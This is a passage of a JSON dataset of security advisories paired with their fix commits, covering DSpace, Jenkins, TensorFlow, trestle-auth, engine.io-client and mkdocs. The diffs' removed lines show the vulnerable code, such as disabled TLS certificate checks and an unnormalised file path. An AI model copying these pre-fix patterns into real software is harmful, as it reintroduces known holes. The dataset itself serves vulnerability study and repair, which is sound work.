            "commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9",
            "commit_sha":"f7758457b7ec3489d525e39aa753cc70809d9ad9",
            "patch":"MULTI",
            "chain_ord":"['f7758457b7ec3489d525e39aa753cc70809d9ad9', '5f72424a478f59061dcc516b866dcc687bc3f9de']",
            "before_first_fix_commit":"{'3b0cdee734d0ee3f2c2cbdcc07c1135c1c048be8'}",
            "last_fix_commit":"5f72424a478f59061dcc516b866dcc687bc3f9de",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/08\/2020, 00:48:56",
            "message":"[DS-4133] Improve URL handling in Controlled Vocab JSPUI servlet",
            "author":"Kim Shepherd",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 2, 'total': 12}",
            "files":"{'dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/f7758457b7ec3489d525e39aa753cc70809d9ad9\/dspace-jspui%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fwebui%2Fservlet%2FControlledVocabularyServlet.java', 'patch': '@@ -14,6 +14,7 @@\\n import javax.servlet.http.HttpServletRequest;\\n import javax.servlet.http.HttpServletResponse;\\n \\n+import org.apache.log4j.Logger;\\n import org.dspace.authorize.AuthorizeException;\\n import org.dspace.core.Context;\\n \\n@@ -25,8 +26,8 @@\\n  *\/\\n public class ControlledVocabularyServlet extends DSpaceServlet\\n {\\n-    \/\/ private static Logger log =\\n-    \/\/ Logger.getLogger(ControlledVocabularyServlet.class);\\n+    private static Logger log =\\n+    Logger.getLogger(ControlledVocabularyServlet.class);\\n \\n     protected void doDSGet(Context context, HttpServletRequest request,\\n             HttpServletResponse response) throws ServletException, IOException,\\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\\n         String filter = \"\";\\n         String callerUrl = request.getParameter(\"callerUrl\");\\n \\n+        \/\/ callerUrl must starts with URL outside DSpace request context path\\n+        if(!callerUrl.startsWith(request.getContextPath())) {\\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\\n+            return;\\n+        }\\n+\\n         if (request.getParameter(\"ID\") != null)\\n         {\\n             ID = request.getParameter(\"ID\");'}}",
            "message_norm":"[ds-4133] improve url handling in controlled vocab jspui servlet",
            "language":"en",
            "entities":"[('improve', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java'])",
            "num_files":1.0,
            "patch_content":"From f7758457b7ec3489d525e39aa753cc70809d9ad9 Mon Sep 17 00:00:00 2001\nFrom: Kim Shepherd <kim@shepherd.nz>\nDate: Wed, 8 Apr 2020 12:48:56 +1200\nSubject: [PATCH] [DS-4133] Improve URL handling in Controlled Vocab JSPUI\n servlet\n\n---\n ...\/webui\/servlet\/ControlledVocabularyServlet.java   | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\ndiff --git a\/dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java b\/dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java\nindex 0736418e8c51..70a1d62f4313 100644\n--- a\/dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java\n+++ b\/dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java\n@@ -14,6 +14,7 @@\n import javax.servlet.http.HttpServletRequest;\n import javax.servlet.http.HttpServletResponse;\n \n+import org.apache.log4j.Logger;\n import org.dspace.authorize.AuthorizeException;\n import org.dspace.core.Context;\n \n@@ -25,8 +26,8 @@\n  *\/\n public class ControlledVocabularyServlet extends DSpaceServlet\n {\n-    \/\/ private static Logger log =\n-    \/\/ Logger.getLogger(ControlledVocabularyServlet.class);\n+    private static Logger log =\n+    Logger.getLogger(ControlledVocabularyServlet.class);\n \n     protected void doDSGet(Context context, HttpServletRequest request,\n             HttpServletResponse response) throws ServletException, IOException,\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\n         String filter = \"\";\n         String callerUrl = request.getParameter(\"callerUrl\");\n \n+        \/\/ callerUrl must starts with URL outside DSpace request context path\n+        if(!callerUrl.startsWith(request.getContextPath())) {\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\n+            return;\n+        }\n+\n         if (request.getParameter(\"ID\") != null)\n         {\n             ID = request.getParameter(\"ID\");",
            "code_diff":"@@ -14,6 +14,7 @@\n import javax.servlet.http.HttpServletRequest;\n import javax.servlet.http.HttpServletResponse;\n \n+import org.apache.log4j.Logger;\n import org.dspace.authorize.AuthorizeException;\n import org.dspace.core.Context;\n \n@@ -25,8 +26,8 @@\n  *\/\n public class ControlledVocabularyServlet extends DSpaceServlet\n {\n-    \/\/ private static Logger log =\n-    \/\/ Logger.getLogger(ControlledVocabularyServlet.class);\n+    private static Logger log =\n+    Logger.getLogger(ControlledVocabularyServlet.class);\n \n     protected void doDSGet(Context context, HttpServletRequest request,\n             HttpServletResponse response) throws ServletException, IOException,\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\n         String filter = \"\";\n         String callerUrl = request.getParameter(\"callerUrl\");\n \n+        \/\/ callerUrl must starts with URL outside DSpace request context path\n+        if(!callerUrl.startsWith(request.getContextPath())) {\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\n+            return;\n+        }\n+\n         if (request.getParameter(\"ID\") != null)\n         {\n             ID = request.getParameter(\"ID\");"
        },
        {
            "index":513,
            "vuln_id":"GHSA-6mv9-hcx5-7mhh",
            "cwe_id":"{'CWE-918'}",
            "score":5.3,
            "chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/2d16b459205730d85e51499c2457109b234ca9d9'}",
            "dataset":"osv",
            "summary":"Server-Side Request Forgery in Jenkins An improper authorization vulnerability exists in Jenkins versions 2.106 and earlier, and LTS 2.89.3 and earlier, that allows an attacker to have Jenkins submit HTTP GET requests and get limited information about the response.",
            "published_date":"2022-05-13",
            "chain_len":1,
            "project":"https:\/\/github.com\/jenkinsci\/jenkins",
            "commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/2d16b459205730d85e51499c2457109b234ca9d9",
            "commit_sha":"2d16b459205730d85e51499c2457109b234ca9d9",
            "patch":"SINGLE",
            "chain_ord":"['2d16b459205730d85e51499c2457109b234ca9d9']",
            "before_first_fix_commit":"{'ccc374a7176d7704941fb494589790b7673efe2e'}",
            "last_fix_commit":"2d16b459205730d85e51499c2457109b234ca9d9",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/30\/2018, 17:15:48",
            "message":"[SECURITY-506] Require admin permission to validate proxy config.",
            "author":"Jesse Glick",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 0, 'total': 2}",
            "files":"{'core\/src\/main\/java\/hudson\/ProxyConfiguration.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/2d16b459205730d85e51499c2457109b234ca9d9\/core%2Fsrc%2Fmain%2Fjava%2Fhudson%2FProxyConfiguration.java', 'patch': '@@ -341,6 +341,8 @@ public FormValidation doValidateProxy(\\n                 @QueryParameter(\"userName\") String userName, @QueryParameter(\"password\") String password,\\n                 @QueryParameter(\"noProxyHost\") String noProxyHost) {\\n \\n+            Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);\\n+\\n             if (Util.fixEmptyAndTrim(testUrl) == null) {\\n                 return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\\n             }'}}",
            "message_norm":"[security-506] require admin permission to validate proxy config.",
            "language":"en",
            "entities":"[('security-506', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('permission', 'SECWORD', ''), ('validate', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['core\/src\/main\/java\/hudson\/ProxyConfiguration.java'])",
            "num_files":1.0,
            "patch_content":"From 2d16b459205730d85e51499c2457109b234ca9d9 Mon Sep 17 00:00:00 2001\nFrom: Jesse Glick <jglick@cloudbees.com>\nDate: Tue, 30 Jan 2018 12:15:48 -0500\nSubject: [PATCH] [SECURITY-506] Require admin permission to validate proxy\n config.\n\n---\n core\/src\/main\/java\/hudson\/ProxyConfiguration.java | 2 ++\n 1 file changed, 2 insertions(+)\n\ndiff --git a\/core\/src\/main\/java\/hudson\/ProxyConfiguration.java b\/core\/src\/main\/java\/hudson\/ProxyConfiguration.java\nindex 7c2809c53f5a..408d5e9c4fb5 100644\n--- a\/core\/src\/main\/java\/hudson\/ProxyConfiguration.java\n+++ b\/core\/src\/main\/java\/hudson\/ProxyConfiguration.java\n@@ -341,6 +341,8 @@ public FormValidation doValidateProxy(\n                 @QueryParameter(\"userName\") String userName, @QueryParameter(\"password\") String password,\n                 @QueryParameter(\"noProxyHost\") String noProxyHost) {\n \n+            Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);\n+\n             if (Util.fixEmptyAndTrim(testUrl) == null) {\n                 return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n             }",
            "code_diff":"@@ -341,6 +341,8 @@ public FormValidation doValidateProxy(\n                 @QueryParameter(\"userName\") String userName, @QueryParameter(\"password\") String password,\n                 @QueryParameter(\"noProxyHost\") String noProxyHost) {\n \n+            Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);\n+\n             if (Util.fixEmptyAndTrim(testUrl) == null) {\n                 return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n             }"
        },
        {
            "index":789,
            "vuln_id":"GHSA-fq86-3f29-px2c",
            "cwe_id":"{'CWE-617'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082'}",
            "dataset":"osv",
            "summary":"`CHECK`-failures during Grappler's `IsSimplifiableReshape` in Tensorflow ### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-07",
            "chain_len":3,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082",
            "commit_sha":"1fb27733f943295d874417630edd3b38b34ce082",
            "patch":"MULTI",
            "chain_ord":"['ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', '1fb27733f943295d874417630edd3b38b34ce082', '240655511cd3e701155f944a972db71b6c0b1bb6']",
            "before_first_fix_commit":"{'1fb27733f943295d874417630edd3b38b34ce082'}",
            "last_fix_commit":"240655511cd3e701155f944a972db71b6c0b1bb6",
            "chain_ord_pos":2.0,
            "commit_datetime":"11\/11\/2021, 17:16:14",
            "message":"Remove `CHECK`-fails from `IsSimplifiableReshape`\n\nPiperOrigin-RevId: 409164987\nChange-Id: I58c7dd459ff348c3dbae95e00c4c5e63b30a4e65",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 2, 'total': 12}",
            "files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1fb27733f943295d874417630edd3b38b34ce082\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1689,7 +1689,11 @@ Status ConstantFolding::IsSimplifiableReshape(\\n   if (!IsReshape(node)) {\\n     return errors::Internal(\"Node \", node.name(), \" is not a Reshape node\");\\n   }\\n-  CHECK_LE(2, node.input_size());\\n+  if (2 > node.input_size()) {\\n+    return errors::Internal(\"Node \", node.name(),\\n+                            \" must have at most 2 inputs but has \",\\n+                            node.input_size());\\n+  }\\n   const NodeDef* new_shape = node_map_->GetNode(node.input(1));\\n   if (!IsReallyConstant(*new_shape)) {\\n     return errors::Internal(\"Node \", node.name(), \" has shape \",\\n@@ -1707,7 +1711,11 @@ Status ConstantFolding::IsSimplifiableReshape(\\n   if (!s.ok()) {\\n     return errors::Internal(\"Could not evaluate node \", node.name());\\n   }\\n-  CHECK_EQ(1, outputs.size());\\n+  if (outputs.size() != 1) {\\n+    return errors::Internal(\"Node \", node.name(),\\n+                            \" must have exactly 1 output but has \",\\n+                            outputs.size());\\n+  }\\n \\n   const std::vector<OpInfo::TensorProperties>& props =\\n       properties.GetInputProperties(node.name());'}}",
            "message_norm":"remove `check`-fails from `issimplifiablereshape`\n\npiperorigin-revid: 409164987\nchange-id: i58c7dd459ff348c3dbae95e00c4c5e63b30a4e65",
            "language":"en",
            "entities":"[('remove', 'ACTION', ''), ('409164987', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])",
            "num_files":1.0,
            "patch_content":"From 1fb27733f943295d874417630edd3b38b34ce082 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Thu, 11 Nov 2021 09:16:14 -0800\nSubject: [PATCH] Remove `CHECK`-fails from `IsSimplifiableReshape`\n\nPiperOrigin-RevId: 409164987\nChange-Id: I58c7dd459ff348c3dbae95e00c4c5e63b30a4e65\n---\n ...\/core\/grappler\/optimizers\/constant_folding.cc     | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\ndiff --git a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\nindex 9087ddb5994129..a2050899f60726 100644\n--- a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n+++ b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n@@ -1689,7 +1689,11 @@ Status ConstantFolding::IsSimplifiableReshape(\n   if (!IsReshape(node)) {\n     return errors::Internal(\"Node \", node.name(), \" is not a Reshape node\");\n   }\n-  CHECK_LE(2, node.input_size());\n+  if (2 > node.input_size()) {\n+    return errors::Internal(\"Node \", node.name(),\n+                            \" must have at most 2 inputs but has \",\n+                            node.input_size());\n+  }\n   const NodeDef* new_shape = node_map_->GetNode(node.input(1));\n   if (!IsReallyConstant(*new_shape)) {\n     return errors::Internal(\"Node \", node.name(), \" has shape \",\n@@ -1707,7 +1711,11 @@ Status ConstantFolding::IsSimplifiableReshape(\n   if (!s.ok()) {\n     return errors::Internal(\"Could not evaluate node \", node.name());\n   }\n-  CHECK_EQ(1, outputs.size());\n+  if (outputs.size() != 1) {\n+    return errors::Internal(\"Node \", node.name(),\n+                            \" must have exactly 1 output but has \",\n+                            outputs.size());\n+  }\n \n   const std::vector<OpInfo::TensorProperties>& props =\n       properties.GetInputProperties(node.name());",
            "code_diff":"@@ -1689,7 +1689,11 @@ Status ConstantFolding::IsSimplifiableReshape(\n   if (!IsReshape(node)) {\n     return errors::Internal(\"Node \", node.name(), \" is not a Reshape node\");\n   }\n-  CHECK_LE(2, node.input_size());\n+  if (2 > node.input_size()) {\n+    return errors::Internal(\"Node \", node.name(),\n+                            \" must have at most 2 inputs but has \",\n+                            node.input_size());\n+  }\n   const NodeDef* new_shape = node_map_->GetNode(node.input(1));\n   if (!IsReallyConstant(*new_shape)) {\n     return errors::Internal(\"Node \", node.name(), \" has shape \",\n@@ -1707,7 +1711,11 @@ Status ConstantFolding::IsSimplifiableReshape(\n   if (!s.ok()) {\n     return errors::Internal(\"Could not evaluate node \", node.name());\n   }\n-  CHECK_EQ(1, outputs.size());\n+  if (outputs.size() != 1) {\n+    return errors::Internal(\"Node \", node.name(),\n+                            \" must have exactly 1 output but has \",\n+                            outputs.size());\n+  }\n \n   const std::vector<OpInfo::TensorProperties>& props =\n       properties.GetInputProperties(node.name());"
        },
        {
            "index":749,
            "vuln_id":"GHSA-h8hx-2c5r-32cf",
            "cwe_id":"{'CWE-352'}",
            "score":8.1,
            "chain":"{'https:\/\/github.com\/TrestleAdmin\/trestle-auth\/commit\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc'}",
            "dataset":"osv",
            "summary":"Cross-Site Request Forgery (CSRF) in trestle-auth ### Impact\nA vulnerability in trestle-auth versions 0.4.0 and 0.4.1 allows an attacker to create a form that will bypass Rails' built-in CSRF protection when submitted by a victim with a trestle-auth admin session. This potentially allows an attacker to alter protected data, including admin account credentials.\n\n### Patches\nThe vulnerability has been fixed in trestle-auth 0.4.2 released to RubyGems.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [trestle-auth](https:\/\/github.com\/TrestleAdmin\/trestle-auth\/issues)\n* Email the maintainer at [sam@sampohlenz.com](mailto:sam@sampohlenz.com)",
            "published_date":"2021-04-13",
            "chain_len":1,
            "project":"https:\/\/github.com\/TrestleAdmin\/trestle-auth",
            "commit_href":"https:\/\/github.com\/TrestleAdmin\/trestle-auth\/commit\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc",
            "commit_sha":"cb95b05cdb2609052207af07b4b8dfe3a23c11dc",
            "patch":"SINGLE",
            "chain_ord":"['cb95b05cdb2609052207af07b4b8dfe3a23c11dc']",
            "before_first_fix_commit":"{'021955aa5d67260d6ba1faf2b5d59b9772164968'}",
            "last_fix_commit":"cb95b05cdb2609052207af07b4b8dfe3a23c11dc",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/12\/2021, 10:12:49",
            "message":"Ensure CSRF protection is prepended before authentication before_actions",
            "author":"Sam Pohlenz",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 0, 'total': 3}",
            "files":"{'lib\/trestle\/auth\/controller\/authentication.rb': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TrestleAdmin\/trestle-auth\/raw\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc\/lib%2Ftrestle%2Fauth%2Fcontroller%2Fauthentication.rb', 'patch': '@@ -9,6 +9,9 @@ module Authentication\\n \\n           prepend_before_action :require_authenticated_user\\n           prepend_before_action :authenticate_user\\n+\\n+          # Ensure that CSRF protection happens before authentication\\n+          protect_from_forgery prepend: true\\n         end\\n \\n       protected'}}",
            "message_norm":"ensure csrf protection is prepended before authentication before_actions",
            "language":"en",
            "entities":"[('ensure', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('protection', 'SECWORD', ''), ('authentication', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/trestle\/auth\/controller\/authentication.rb'])",
            "num_files":1.0,
            "patch_content":"From cb95b05cdb2609052207af07b4b8dfe3a23c11dc Mon Sep 17 00:00:00 2001\nFrom: Sam Pohlenz <sam@sampohlenz.com>\nDate: Mon, 12 Apr 2021 19:42:49 +0930\nSubject: [PATCH] Ensure CSRF protection is prepended before authentication\n before_actions\n\n---\n lib\/trestle\/auth\/controller\/authentication.rb | 3 +++\n 1 file changed, 3 insertions(+)\n\ndiff --git a\/lib\/trestle\/auth\/controller\/authentication.rb b\/lib\/trestle\/auth\/controller\/authentication.rb\nindex d37fc9b..0b0462b 100644\n--- a\/lib\/trestle\/auth\/controller\/authentication.rb\n+++ b\/lib\/trestle\/auth\/controller\/authentication.rb\n@@ -9,6 +9,9 @@ module Authentication\n \n           prepend_before_action :require_authenticated_user\n           prepend_before_action :authenticate_user\n+\n+          # Ensure that CSRF protection happens before authentication\n+          protect_from_forgery prepend: true\n         end\n \n       protected",
            "code_diff":"@@ -9,6 +9,9 @@ module Authentication\n \n           prepend_before_action :require_authenticated_user\n           prepend_before_action :authenticate_user\n+\n+          # Ensure that CSRF protection happens before authentication\n+          protect_from_forgery prepend: true\n         end\n \n       protected"
        },
        {
            "index":386,
            "vuln_id":"GHSA-4r4m-hjwj-43p8",
            "cwe_id":"{'CWE-300'}",
            "score":0.0,
            "chain":"{'https:\/\/github.com\/socketio\/engine.io-client\/commit\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1'}",
            "dataset":"osv",
            "summary":"Insecure Defaults Allow MITM Over TLS in engine.io-client Affected versions of `engine.io-client` do not verify certificates by default, and as such may be vulnerable to Man-in-the-Middle attacks.\n\nThe vulnerability is related to the way that node.js handles the `rejectUnauthorized` setting. If the value is something that evaluates to false, such as undefined or null, certificate verification will be disabled. \n\n\n\n## Recommendation\n\nUpdate to version 1.6.9 or later.\n\nIf you are unable to upgrade, ensure all calls to socket.io to have a `rejectedUnauthorized: true` flag.",
            "published_date":"2019-02-18",
            "chain_len":1,
            "project":"https:\/\/github.com\/socketio\/engine.io-client",
            "commit_href":"https:\/\/github.com\/socketio\/engine.io-client\/commit\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1",
            "commit_sha":"2c55b278a491bf45313ecc0825cf800e2f7ff5c1",
            "patch":"SINGLE",
            "chain_ord":"['2c55b278a491bf45313ecc0825cf800e2f7ff5c1']",
            "before_first_fix_commit":"{'6045ccf5aa3ad5dbd976acb1e722a9692a5d55fb'}",
            "last_fix_commit":"2c55b278a491bf45313ecc0825cf800e2f7ff5c1",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/30\/2016, 15:30:14",
            "message":"default `rejectUnauthorized` to `true`",
            "author":"Guillermo Rauch",
            "comments":"{'com_1': {'author': 'andrew-aladev', 'datetime': '09\/28\/2016, 13:48:33', 'body': 'WAT? I am sure that you haven\\'t tested websocket with this \"patch\".'}}",
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'lib\/socket.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/socketio\/engine.io-client\/raw\/2c55b278a491bf45313ecc0825cf800e2f7ff5c1\/lib%2Fsocket.js', 'patch': \"@@ -90,7 +90,7 @@ function Socket (uri, opts) {\\n   this.cert = opts.cert || null;\\n   this.ca = opts.ca || null;\\n   this.ciphers = opts.ciphers || null;\\n-  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? null : opts.rejectUnauthorized;\\n+  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? true : opts.rejectUnauthorized;\\n \\n   \/\/ other options for Node.js client\\n   var freeGlobal = typeof global === 'object' && global;\"}}",
            "message_norm":"default `rejectunauthorized` to `true`",
            "language":"ro",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/socket.js'])",
            "num_files":1.0,
            "patch_content":"From 2c55b278a491bf45313ecc0825cf800e2f7ff5c1 Mon Sep 17 00:00:00 2001\nFrom: Guillermo Rauch <rauchg@gmail.com>\nDate: Wed, 30 Mar 2016 08:30:14 -0700\nSubject: [PATCH] default `rejectUnauthorized` to `true`\n\n---\n lib\/socket.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/lib\/socket.js b\/lib\/socket.js\nindex 9a3656358..c13649946 100644\n--- a\/lib\/socket.js\n+++ b\/lib\/socket.js\n@@ -90,7 +90,7 @@ function Socket (uri, opts) {\n   this.cert = opts.cert || null;\n   this.ca = opts.ca || null;\n   this.ciphers = opts.ciphers || null;\n-  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? null : opts.rejectUnauthorized;\n+  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? true : opts.rejectUnauthorized;\n \n   \/\/ other options for Node.js client\n   var freeGlobal = typeof global === 'object' && global;",
            "code_diff":"@@ -90,7 +90,7 @@ function Socket (uri, opts) {\n   this.cert = opts.cert || null;\n   this.ca = opts.ca || null;\n   this.ciphers = opts.ciphers || null;\n-  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? null : opts.rejectUnauthorized;\n+  this.rejectUnauthorized = opts.rejectUnauthorized === undefined ? true : opts.rejectUnauthorized;\n \n   \/\/ other options for Node.js client\n   var freeGlobal = typeof global === 'object' && global;"
        },
        {
            "index":865,
            "vuln_id":"GHSA-qh9q-34h6-hcv9",
            "cwe_id":"{'CWE-12', 'CWE-22'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/mkdocs\/mkdocs\/pull\/2604\/commits\/cddc453c9d49298e60e7d56fb71130c151cbcbe5'}",
            "dataset":"osv",
            "summary":"Directory traversal in mkdocs The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information.",
            "published_date":"2021-10-12",
            "chain_len":1,
            "project":"https:\/\/github.com\/mkdocs\/mkdocs",
            "commit_href":"https:\/\/github.com\/mkdocs\/mkdocs\/pull\/2604\/commits\/cddc453c9d49298e60e7d56fb71130c151cbcbe5",
            "commit_sha":"cddc453c9d49298e60e7d56fb71130c151cbcbe5",
            "patch":"SINGLE",
            "chain_ord":"['cddc453c9d49298e60e7d56fb71130c151cbcbe5']",
            "before_first_fix_commit":"{'c426455878556baa34cc829c579337236d335581'}",
            "last_fix_commit":"cddc453c9d49298e60e7d56fb71130c151cbcbe5",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/10\/2021, 08:52:05",
            "message":"Prevent directory traversal in the dev server",
            "author":"Oleh Prypin",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 1, 'total': 5}",
            "files":"{'mkdocs\/livereload\/__init__.py': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mkdocs\/mkdocs\/raw\/cddc453c9d49298e60e7d56fb71130c151cbcbe5\/mkdocs%2Flivereload%2F__init__.py', 'patch': '@@ -4,6 +4,7 @@\\n import mimetypes\\n import os\\n import os.path\\n+import posixpath\\n import re\\n import socketserver\\n import threading\\n@@ -183,9 +184,11 @@ def condition():\\n         if path == \"\/js\/livereload.js\":\\n             file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\\n         elif path.startswith(self.mount_path):\\n-            rel_file_path = path[len(self.mount_path):].lstrip(\"\/\")\\n+            rel_file_path = path[len(self.mount_path):]\\n             if path.endswith(\"\/\"):\\n                 rel_file_path += \"index.html\"\\n+            # Prevent directory traversal - normalize the path.\\n+            rel_file_path = posixpath.normpath(\"\/\" + rel_file_path).lstrip(\"\/\")\\n             file_path = os.path.join(self.root, rel_file_path)\\n         elif path == \"\/\":\\n             start_response(\"302 Found\", [(\"Location\", self.mount_path)])'}}",
            "message_norm":"prevent directory traversal in the dev server",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('directory traversal', 'SECWORD', ''), ('server', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['mkdocs\/livereload\/__init__.py'])",
            "num_files":1.0,
